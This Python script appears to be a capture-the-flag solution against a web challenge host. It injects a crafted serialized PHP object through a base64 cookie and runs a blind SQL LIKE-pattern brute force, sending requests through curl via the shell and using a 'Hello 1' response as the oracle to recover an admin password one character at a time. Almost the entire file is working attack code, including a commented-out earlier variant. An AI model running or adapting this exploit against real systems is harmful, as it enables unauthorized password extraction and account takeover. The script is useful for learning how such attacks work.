#!/usr/bin/python
import sys, subprocess

"""
template = '''curl -s http://web.camsctf.com/f/admin.php -b `php source.php LIKE_STRING`'''
def guess(like_string, char):
    output = subprocess.Popen(template.replace("LIKE_STRING", like_string + char), shell=True, stdout=subprocess.PIPE).stdout.read()
    if "Hello 1" in output:
        like_string += char
    return like_string
"""
template = '''curl -s http://web.camsctf.com/f/admin.php -b COOKIE'''
serialized_object = open("template","r").read().strip()
def guess(like_string, char):
    data = "data=" + serialized_object.replace("LIKE_STRING", like_string + char).replace("LENGTH", str(len(like_string+char) + 56)).encode("base64").replace("\n","")
    output = subprocess.Popen(template.replace("COOKIE", data), shell=True, stdout=subprocess.PIPE).stdout.read()
    if "Hello 1" in output:
        like_string += char
    return like_string

alpha = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
punctuation = ''' !"#$&()*+,-./:;<=>?@[\]^`{|}~'''
alpha += list(punctuation)
alpha.append("\\'")
alpha.append("\\_")
alpha.append("\\%")

print alpha

def brute():
    length = 15
    print "Running brute force..."
    answer = ""
    for i in range(0 , length):
        for c in alpha:
            print(answer + c)
            bkup = answer
            answer = guess(answer, c)
            sys.stdout.write("\033[F") # Cursor up one line
            if bkup != answer:
                break

    print ""
    print "Password: " + "\033[1;31m" + answer + "\033[m"

brute()
